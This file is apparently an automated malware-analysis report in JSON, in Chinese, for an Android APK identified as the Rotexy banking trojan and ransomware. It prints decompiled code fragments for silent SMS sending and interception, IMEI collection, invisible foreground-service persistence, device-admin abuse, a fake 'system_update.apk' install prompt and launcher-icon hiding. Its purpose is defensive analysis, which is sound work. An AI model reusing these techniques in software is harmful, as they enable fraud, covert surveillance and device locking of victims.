@@ -1,0 +1,298 @@
+{
+  "APK信息": {
+    "文件名": "ba4beb97f5d4ba33162f769f43ec8e7d1ae501acdade792a4a577cd6449e1a84.apk",
+    "sha256": "ba4beb97f5d4ba33162f769f43ec8e7d1ae501acdade792a4a577cd6449e1a84",
+    "包名": "org.android.sys",
+    "应用名": "Install",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 694.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "register"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\BinderAdmin;",
+          "method_signature": "onStartCommand(Intent intent, int flags, int startId)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int flags, int startId) {\n    final String device_block = Plugs.getInstance(this).getPrivateData(\"device_block\");\n    timer = new Timer();\n    task = new TimerTask() {\n        public void run() {\n            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) BinderAdmin.this.getSystemService(\"device_policy\");\n            ComponentName componentName = new ComponentName(BinderAdmin.this.getApplication(), (Class<?>) AdminReceiver.class);\n            if (devicePolicyManager.isAdminActive(componentName) || (device_block != null && device_block.equals(\"not\"))) {",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int flags, int startId) {\n>>>         final String device_block = Plugs.getInstance(this).getPrivateData(\"device_block\");\n>>>         this.someSkipCounter = 0;\n>>>         timer = new Timer();\n>>>         task = new TimerTask() { // from class: org.android.sys.BinderAdmin.1\n>>>             @Override // java.util.TimerTask, java.lang.Runnable\n>>>             public void run() {\n>>>                 BinderAdmin.access$008(BinderAdmin.this);\n                  DevicePolicyManager devicePolicyManager = (DevicePolicyManager) BinderAdmin.this.getSystemService(\"device_policy\");\n                  ComponentName componentName = new ComponentName(BinderAdmin.this.getApplication(), (Class<?>) AdminReceiver.class);\n                  if (devicePolicyManager.isAdminActive(componentName) || (device_block != null && device_block.equals(\"not\"))) {",
+          "behavior_description": "该代码是Rotexy银行木马/勒索软件的C2命令执行与设备管控服务（伪装为系统类org.android.sys.BinderAdmin）。服务启动时从本地私有存储读取C2服务器此前下发的device_block勒索指令（Plugs.getPrivateData），随后创建Timer定时任务周期性执行：获取DevicePolicyManager并检查恶意AdminReceiver是否保持设备管理员激活状态，结合C2下发的device_block命令值决定后续设备锁定/阻断逻辑。数据流向：C2服务器下发命令→本地私有存储→getPrivateData读取→DevicePolicyManager设备管理操作（维持管理员权限防止卸载、执行设备阻断勒索）。该服务既是C2命令的落地执行点，也是通过设备管理员权限实现防卸载保活和勒索锁屏的关键组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "if(Plugs.isProSender)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String phone = (String) Plugs.this.phones.get(Plugs.sended_count);\nSmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(phone, null, Plugs.msg, sentPI, null);",
+          "malicious_code_snippet_context": "                      if (Plugs.isProSender) {\n                          Plugs.msg = (String) Plugs.this.msgs.get(Plugs.sended_count);\n                      }\n>>>                     String phone = (String) Plugs.this.phones.get(Plugs.sended_count);\n>>>                     int unused = Plugs.smsControllerBlockCount = 0;\n>>>                     Plugs.lockedSend = true;\n                      Plugs.access$008();\n                      Intent sentIntent = new Intent(Plugs.this.context, (Class<?>) Boot.class);\n                      sentIntent.setAction(Plugs.ReceiveSmsProSent);",
+          "behavior_description": "该代码是 Rotexy 银行木马的短信群发模块（contactsSend_v2）。代码从电话号码列表 Plugs.phones 中按计数器 sended_count 逐个取出号码，通过 SmsManager.sendTextMessage() 在用户无感知的情况下静默发送短信（内容为 Plugs.msg），并通过 PendingIntent（Boot 广播接收器 ReceiveSmsProSent）监听发送结果以控制群发流程。数据流向：号码列表与短信内容（通常来自 C2 命令或通讯录）→ SmsManager.sendTextMessage() 静默发送。代码还包含 smsControllerBlockCount 计数与超限重置逻辑（俄语日志'Аварийно восстановлен доступ к контроллеру SMS'），用于规避系统短信控制器限制、保证持续群发。此类静默短信群发可导致用户话费损失、向付费号码扣费或向联系人传播钓鱼/诈骗内容，属于明确的短信欺诈恶意行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\android\\sys\\Boot;",
+          "method_signature": "if(action.equals(\"android.intent.action.APP_ERROR\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (action.equals(\"android.intent.action.APP_ERROR\")) {\n    Plugs.onServiceRestart(context, SuperService.class);\n    abortBroadcast();\n}\nif (action.equals(Plugs.ReceivePushSmsFromServer)) {\n    plugs.msgSendInBase();\n} else if (action.equals(Plugs.ReceiveSMSSent)) {\n    String phone = intent.getStringExtra(\"phone\");\n    String msg = intent.getStringExtra(\"msg\");\n    if (getResultCode() == -1) {\n        int msg_id = plugs.msgSaveFromBase(phone, msg, \"outbox\", \"sent\");\n        plugs.hideNotification(1);",
+          "malicious_code_snippet_context": "          if (action.equals(\"android.intent.action.BOOT_COMPLETED\") || action.equals(\"com.htc.intent.action.QUICKBOOT_POWERON\") || action.equals(\"android.intent.action.QUICKBOOT_POWERON\")) {\n              plugs.msgSaveFromBase(\"System\", \"Устройство перезапущенно в \" + Plugs.getDate(), \"inbox\", \"unknown\");\n          }\n>>>         if (action.equals(\"android.intent.action.APP_ERROR\")) {\n>>>             plugs.msgSaveFromBase(\"System\", \"Приложение вылетело в \" + Plugs.getDate() + \" перезапускам его\", \"inbox\", \"unknown\");\n>>>             Plugs.onServiceRestart(context, SuperService.class);\n>>>             abortBroadcast();\n>>>         }\n>>>         if (action.equals(Plugs.ReceivePushSmsFromServer)) {\n>>>             plugs.msgSendInBase();\n>>>             Plugs.log(\"Boot.onReceive\", \"Отправляем последнее сообщение на панель, если есть\");\n>>>         } else if (action.equals(Plugs.ReceiveSMSSent)) {\n>>>             String phone = intent.getStringExtra(\"phone\");\n>>>             String msg = intent.getStringExtra(\"msg\");\n>>>             if (getResultCode() == -1) {\n                  int msg_id = plugs.msgSaveFromBase(phone, msg, \"outbox\", \"sent\");\n                  plugs.hideNotification(1);\n                  Plugs.log(\"Boot.onReceive\", \"Сообщение с ID: \" + msg_id + \" отправлено\");",
+          "behavior_description": "该代码是Rotexy银行木马的Boot广播接收器。核心恶意行为：1) 收到C2服务器推送指令ReceivePushSmsFromServer时，调用msgSendInBase()将设备上拦截存储的最新短信内容上传至远程控制面板（代码注释明确写着'Отправляем последнее сообщение на панель'即'发送最后一条消息到面板'），实现短信窃取；2) 收到APP_ERROR广播时调用abortBroadcast()中止广播传播，阻止系统崩溃对话框暴露木马异常，同时通过onServiceRestart()自动重启恶意服务SuperService实现崩溃自愈与持久化；3) 监听ReceiveSMSSent回调确认静默发送短信的结果并调用hideNotification()隐藏通知，掩盖木马后台发短信的行为。数据流向：短信数据库/收件箱内容→读取后经网络上传至C2服务器面板；同时利用abortBroadcast()和hideNotification()隐藏恶意痕迹。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "if(init_imei != null)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String init_imei = getPrivateData(\"init_imei\");\nif (init_imei != null) {\n    str = init_imei;\n} else {\n    imei = info.getDeviceId();\n    setPrivateData(\"init_imei\", imei);\n}\nreturn str;",
+          "malicious_code_snippet_context": "      public synchronized String getIMEI() {\n          String imei;\n          String str;\n>>>         String init_imei = getPrivateData(\"init_imei\");\n>>>         if (init_imei != null) {\n>>>             str = init_imei;\n>>>         } else {\n>>>             try {\n>>>                 imei = info.getDeviceId();\n>>>             } catch (SecurityException e) {\n>>>                 imei = getVirtualImei();\n                  log(\"Plugs.getIMEI\", \"[WARNING] Система безопастности отказала выдать IMEI, выдаем виртуальный: \" + imei);\n                  msgSaveFromBase(\"System\", \"Система безопастности отказала выдать IMEI, выдаем виртуальный: \" + imei, \"inbox\", \"unknown\");\n              }",
+          "behavior_description": "该代码位于Rotexy银行木马的核心类org.android.sys.Plugs中（伪装成系统包名）。代码通过TelephonyManager.getDeviceId()采集设备IMEI唯一标识符，若系统安全机制抛出SecurityException拒绝提供真实IMEI，则生成虚拟IMEI作为替代以保证指纹采集不失效，随后将IMEI持久化缓存到私有存储并返回给调用方。数据流向为：getDeviceId()读取设备硬件标识 → setPrivateData()本地持久化缓存 → 返回值供木马其他模块使用，用于向C2服务器注册和识别受感染设备，实现对受害者的长期追踪，属于典型的恶意设备指纹采集行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\BinderAdmin;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class BinderAdmin extends Service {\n    public static TimerTask task;\n}",
+          "malicious_code_snippet_context": "  import java.util.TimerTask;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class BinderAdmin extends Service {\n>>>     public static TimerTask task;\n>>>     public static Timer timer;\n      private int skipCounter = 30;\n      private int someSkipCounter = 0;\n  ",
+          "behavior_description": "该类 BinderAdmin 继承自 Service 并导入 android.app.admin.DevicePolicyManager（设备管理器API），配合 Timer/TimerTask 定时任务机制，是 Rotexy 家族勒索模块的典型实现：样本在诱骗用户激活设备管理员权限后，通过 DevicePolicyManager 调用 lockNow() 强制锁定屏幕（TimerTask 用于反复触发锁屏防止用户解锁），随后弹出勒索信息要求支付赎金。数据流向为：C2 下发锁屏指令/定时器触发(source) → DevicePolicyManager.lockNow() 锁定设备(sink)，导致用户无法正常使用设备，直接造成用户损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\android\\sys\\MCrypt;",
+          "method_signature": "if(text == null || text.length()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.cipher.init(1, this.keyspec, this.ivspec);\nbyte[] encrypted = this.cipher.doFinal(padString(text2).getBytes());\nreturn encrypted;",
+          "malicious_code_snippet_context": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.cipher.init(1, this.keyspec, this.ivspec);\nbyte[] encrypted = this.cipher.doFinal(padString(text2).getBytes());\nreturn encrypted;",
+          "behavior_description": "该代码是AES加密引擎（MCrypt类）：将传入的字符串数据先进行Base64编码，再使用预置密钥(keyspec)和初始向量(ivspec)以ENCRYPT_MODE(1)初始化AES Cipher，对填充后的数据执行AES-CBC加密并返回密文。该样本已被厂商确认为Rotexy家族（银行木马+勒索软件），此加密原语被勒索模块调用，对用户文件内容进行加密，使文件无法访问并借此勒索赎金，直接造成用户数据损失。数据流向：待加密数据（文件内容/字符串参数text）→ Base64编码 → AES加密 → 返回密文。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\BinderAdmin;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "timer.schedule(task, 0L, 900L);\nif (Build.VERSION.SDK_INT >= 16) {\n    Notification.Builder builder = new Notification.Builder(this).setSmallIcon(R.drawable.ic_launcher);\n    startForeground(Plugs.SystemForegroundId, builder.build());\n    stopForeground(true);\n} else if (Build.VERSION.SDK_INT >= 11) {\n    startForeground(Plugs.SystemForegroundId, builder2.getNotification());\n    stopForeground(true);\n}",
+          "malicious_code_snippet_context": "                  BinderAdmin.this.startActivity(admin_activity);\n              }\n          };\n>>>         timer.schedule(task, 0L, 900L);\n>>>         if (Build.VERSION.SDK_INT >= 16) {\n>>>             Notification.Builder builder = new Notification.Builder(this).setSmallIcon(R.drawable.ic_launcher);\n>>>             startForeground(Plugs.SystemForegroundId, builder.build());\n>>>             stopForeground(true);\n>>>         } else if (Build.VERSION.SDK_INT >= 11) {\n>>>             Notification.Builder builder2 = new Notification.Builder(this).setSmallIcon(R.drawable.ic_launcher);\n>>>             startForeground(Plugs.SystemForegroundId, builder2.getNotification());\n>>>             stopForeground(true);\n          }\n          return 1;\n      }",
+          "behavior_description": "该代码位于已确认恶意样本（Rotexy银行木马/勒索家族）的服务组件BinderAdmin中。核心手法是'隐形前台服务'保活技巧：先调用startForeground()将服务提升至前台优先级，随后立即调用stopForeground(true)移除通知，使服务获得前台级高优先级而难以被系统回收或用户查杀，同时用户看不到任何通知，实现无感知的隐蔽持久化。此外，代码还以900毫秒间隔循环启动SetAdmin活动（设备管理员激活界面，Intent flags为NEW_TASK|REORDER_TO_FRONT），高频强制弹窗迫使用户激活设备管理员，进一步增强木马的持久化与防卸载能力。数据流向：无隐私数据输入（source仅为系统版本检测Build.VERSION.SDK_INT），危险操作（sink）为startForeground/stopForeground服务提权保活及高频强制弹出设备管理员激活页。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "onPostExecute(Void aVoid)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent update = new Intent(\"android.intent.action.VIEW\");\nUri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\nupdate.setDataAndType(uri, \"application/vnd.android.package-archive\");\nupdate.setFlags(268435456);\nPlugs.this.context.startActivity(update);",
+          "malicious_code_snippet_context": "          /* JADX INFO: Access modifiers changed from: protected */\n          @Override // android.os.AsyncTask\n          public void onPostExecute(Void aVoid) {\n>>>             Intent update = new Intent(\"android.intent.action.VIEW\");\n>>>             Uri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\n>>>             update.setDataAndType(uri, \"application/vnd.android.package-archive\");\n>>>             update.setFlags(268435456);\n>>>             Plugs.this.context.startActivity(update);\n          }\n      }\n  ",
+          "behavior_description": "该代码是 Rotexy 银行木马（banker+ransomware）的载荷下载安装机制。前置 getUrl 异步任务从远程 C2 服务器静默下载 APK 至公共下载目录并伪装命名为 system_update.apk（假冒系统更新），下载完成后在 onPostExecute 回调中通过 ACTION_VIEW Intent（MIME 类型 application/vnd.android.package-archive）并设置 FLAG_ACTIVITY_NEW_TASK 调起系统包安装器，突然弹出安装界面利用社会工程学诱导用户确认安装攻击者控制的恶意载荷（木马自身更新或附加恶意模块）。数据流向：C2 服务器静默下载的 APK 文件 → 系统包安装器安装执行恶意代码。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\ErrorInstall;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ComponentName com = new ComponentName(getApplicationContext().getPackageName(), Launcher.class.getPackage().getName() + \".\" + Launcher.class.getSimpleName());\ngetPackageManager().setComponentEnabledSetting(com, 2, 1);",
+          "malicious_code_snippet_context": "          TextView error_text_code = (TextView) findViewById(R.id.error_text_code);\n          error_text_code.setText(\"(Ошибка: 404)\");\n          try {\n>>>             ComponentName com = new ComponentName(getApplicationContext().getPackageName(), Launcher.class.getPackage().getName() + \".\" + Launcher.class.getSimpleName());\n>>>             getPackageManager().setComponentEnabledSetting(com, 2, 1);\n              if (BinderAdmin.timer != null) {\n                  BinderAdmin.timer.cancel();\n                  BinderAdmin.timer = null;",
+          "behavior_description": "该代码在 onCreate 中先向用户展示伪造的俄语'安装失败'错误界面（'Не удалось установить приложение' / 'Ошибка: 404'），诱使用户误以为应用未安装成功；随后通过 setComponentEnabledSetting 将应用的 Launcher 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，实现图标隐藏。同时取消 BinderAdmin 定时器并停止 BinderAdmin 服务以消除运行痕迹。数据流向：应用包名与 Launcher 类名 → 构造 ComponentName → getPackageManager().setComponentEnabledSetting() 禁用启动器组件。这是 Rotexy 银行木马典型的隐蔽驻留手法，配合假错误提示防止用户察觉与卸载，为后续银行欺诈和勒索行为提供隐蔽环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
